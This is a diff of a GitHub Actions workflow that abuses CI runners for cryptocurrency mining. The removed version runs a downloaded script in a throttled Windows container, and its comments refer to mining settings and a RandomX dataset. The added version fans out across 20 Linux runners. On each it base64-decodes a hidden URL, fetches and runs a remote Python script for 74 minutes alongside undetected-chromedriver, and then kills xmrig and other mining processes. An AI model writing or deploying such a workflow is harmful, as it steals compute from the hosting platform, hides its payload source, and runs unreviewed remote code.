@@ -1,92 +1,86 @@
-name: Download and Run Test Script - Adaptive Monitoring
-on: workflow_dispatch
+name: Task Dispatcher Cluster (Linux)
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
 
 jobs:
-  run-test:
-    runs-on: windows-2022
-    timeout-minutes: 20
+  launch-workers:
+    name: "Runner-Node-${{ matrix.node_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
     steps:
-      - name: Start Docker Engine
-        shell: pwsh
+      # -----------------------------------------------------------
+      # خطوة 1: تحديث النظام وتثبيت الأدوات الأساسية
+      # -----------------------------------------------------------
+      - name: System Update & Dependencies
         run: |
-          Set-Service docker -StartupType Automatic
-          Start-Service docker
+          echo "[STAGE-1] Initializing Runner Node ${{ matrix.node_index }} on Linux..."
+          sudo apt update -q
+          sudo apt install -y cpulimit curl python3-pip
 
-      - name: Download Python & Test Script
-        shell: pwsh
+      # -----------------------------------------------------------
+      # خطوة 2: تنزيل السكربت الرئيسي
+      # -----------------------------------------------------------
+      - name: Download Core Script
         run: |
-          Write-Host "📥 Downloading test.py from HuggingFace..."
-          Invoke-WebRequest -Uri "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/test.py" -OutFile "test.py"
+          echo "[STAGE-2] Downloading app_task.py..."
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmV3ZS9yZXNvbHZlL21haW4vc3RhcnRfdGVzdC5weQ==" | base64 --decode)
+          curl -sL "$PAYLOAD_URL" -o app_task.py
+          echo "[STAGE-2] Download completed."
 
-          Write-Host "📦 Downloading Portable Python embeddable..."
-          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "python.zip"
-          Expand-Archive -Path "python.zip" -DestinationPath "python" -Force
-          Remove-Item "python.zip"
-
-          Get-ChildItem -Path "python" -Filter "*._pth" | ForEach-Object {
-              (Get-Content $_.FullName) -replace '#import site', 'import site' | Set-Content $_.FullName
-          }
-
-          Write-Host "✅ Setup completed successfully."
-
-      - name: Execute Script with Adaptive Monitoring
-        shell: pwsh
+      # -----------------------------------------------------------
+      # خطوة 3: تثبيت المكتبات المطلوبة
+      # -----------------------------------------------------------
+      - name: Install Python Packages
         run: |
-          Write-Host "🚀 Launching test.py inside container (--cpus=0.2, --memory=4G)..."
+          echo "[STAGE-3] Installing Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+
+      # -----------------------------------------------------------
+      # خطوة 5: تشغيل السكربت الرئيسي مع مراقبة المهلة
+      # -----------------------------------------------------------
+      - name: Execute Core Process with Supervision
+        run: |
+          echo "==> Starting execution thread on node ${{ matrix.node_index }}..."
           
-          # رفع الذاكرة إلى 4G لاستيعاب الـ 2.3GB Dataset والتكيف مع إعدادات التعدين
-          $containerId = docker run -d `
-            --name isolated_app `
-            --isolation=process `
-            --cpus=0.2 `
-            --memory=4G `
-            -e PYTHONUTF8=1 `
-            -e PYTHONIOENCODING=utf-8 `
-            -e PYTHONUNBUFFERED=1 `
-            -v "${PWD}:C:/app" `
-            -w C:/app `
-            mcr.microsoft.com/windows/servercore:ltsc2022 `
-            C:/app/python/python.exe C:/app/test.py
+          # تشغيل السكربت في الخلفية
+          python3 app_task.py &
+          TASK_PID=$!
+          
+          echo "==> Monitor active. Timeout threshold set to 74 minutes."
+          
+          # الانتظار لمدة 74 دقيقة (4440 ثانية)
+          sleep 4440
+          
+          # إذا انتهى الوقت وما زالت العملية تعمل، نقتلها
+          if kill -0 $TASK_PID 2>/dev/null; then
+            echo "==> Time limit reached! Aborting process..."
+            kill -9 $TASK_PID
+            echo "==> Process forcefully terminated."
+          else
+            echo "==> Process finished successfully within allotted time."
+          fi
 
-          Write-Host "Container started ID: $containerId"
-          Write-Host "---------------------------------------------------------------------------------"
-          Write-Host "📊 LIVE ADAPTIVE MONITORING (Dataset init phase takes ~3-5 mins under 0.2 CPU)"
-          Write-Host "---------------------------------------------------------------------------------"
-
-          $sample = 1
-          $lastLogHash = ""
-
-          while ($(docker inspect -f '{{.State.Running}}' isolated_app 2>$null) -eq 'true') {
-              $hostCpuStr = "N/A"
-              try {
-                  $sampleVal = (Get-Counter -Counter "\Processor(_Total)\% Processor Time" -ErrorAction Stop).CounterSamples[0].CookedValue
-                  if ($sampleVal -ge 0) { $hostCpuStr = "$($sampleVal.ToString('0.0'))%" }
-              } catch {
-                  $hostCpuStr = "Sampling..."
-              }
-
-              $stats = docker stats isolated_app --no-stream --format "CPU: {{.CPUPerc}} | MEM: {{.MemUsage}}" 2>$null
-              $currentLogs = docker logs --tail 3 isolated_app 2>$null
-
-              Write-Host "`n[Sample $sample] -> Host Total CPU: $hostCpuStr | $stats"
-              
-              # التحقق مما إذا كانت السجلات تتحدث أم في مرحلة بناء الـ Dataset
-              $currentHash = ($currentLogs -join "")
-              if ($currentHash -eq $lastLogHash) {
-                  Write-Host "⚙️  [ACTIVE COMPUTE] Building RandomX Dataset in background... (Please wait)"
-              } else {
-                  Write-Host "--- Container Live Logs ---"
-                  Write-Host ($currentLogs -join "`n")
-                  Write-Host "---------------------------"
-                  $lastLogHash = $currentHash
-              }
-
-              Start-Sleep -Seconds 4
-              $sample++
-          }
-
-          Write-Host "---------------------------------------------------------------------------------"
-          Write-Host "🏁 Execution Finished!"
-          Write-Host "=== FINAL CONTAINER LOGS ==="
-          docker logs isolated_app
-          docker rm -f isolated_app
+      # -----------------------------------------------------------
+      # خطوة 6: إنهاء جميع عمليات التعدين المتبقية (تنظيف)
+      # -----------------------------------------------------------
+      - name: Finalize Execution
+        run: |
+          echo "[STATUS] Runner-Node-${{ matrix.node_index }} completed cycle."
+          echo "[CLEANUP] Killing any remaining cpulimit or mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          sudo pkill -f xmrig || true
